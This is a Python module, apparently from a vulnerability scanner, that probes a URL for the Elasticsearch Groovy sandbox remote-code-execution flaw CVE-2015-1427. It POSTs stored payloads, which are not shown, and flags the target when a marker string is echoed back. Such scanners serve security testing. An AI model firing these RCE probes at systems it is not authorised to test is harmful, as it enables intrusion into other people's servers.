#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.tool.logger import logger
from lib.tool import check
from thirdparty import requests
from time import sleep

def cve_2015_1427_scan(self, url):
    ''' ElasticSearch支持使用“在沙盒中的”Groovy语言作为动态脚本, 
        但显然官方的工作并没有做好, lupin和tang3分别提出了两种执行命令的方法
    '''
    vul_info = {}
    vul_info['app_name'] = self.app_name
    vul_info['vul_type'] = 'RCE'
    vul_info['vul_id'] = 'CVE-2015-1427'
    vul_info['vul_method'] = 'POST'

    for payload in self.cve_2015_1427_payloads:
        path = payload['path']
        data = payload['data']
        headers = payload['headers']
        target = url + path

        vul_info['path'] = path
        vul_info['data'] = data
        vul_info['headers'] = headers
        vul_info['target'] = target

        try:
            res = requests.post(
                target, 
                timeout=self.timeout, 
                headers=headers,
                data=data, 
                proxies=self.proxies, 
                verify=False,
                allow_redirects=False
            )
            logger.logging(vul_info, res.status_code, res)                        # * LOG
            sleep(1)

            # todo 判断
            if (self.md in check.check_res(res.text, self.md)):
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Request': res
                }
                return results

        except requests.ConnectTimeout:
            logger.logging(vul_info, 'Timeout')
            return None
        except requests.ConnectionError:
            logger.logging(vul_info, 'Faild')
            return None
        except:
            logger.logging(vul_info, 'Error')
            return None
